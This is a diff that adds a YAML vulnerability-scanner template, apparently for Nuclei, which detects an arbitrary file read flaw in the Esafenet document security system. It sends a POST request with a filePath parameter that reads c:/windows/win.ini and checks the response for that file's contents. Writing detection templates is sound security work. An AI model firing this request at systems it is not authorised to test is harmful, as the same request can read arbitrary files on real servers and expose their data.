@@ -1,0 +1,32 @@
+id: yisaitong-esafenet-uploadfilemanagerservice-anyfile-read
+info:
+  name: 亿赛通电子文档安全管理系统 UploadFileManagerService 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 文件读取
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/CDGServer3/document/UploadFileManagerService;login"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "command=ViewUploadFile&filePath=c:/windows/win.ini&fileName1=hello"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "[files]"
+          - "; for 16-bit app support"
+      - type: word
+        part: header
+        words:
+          - "filename="
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
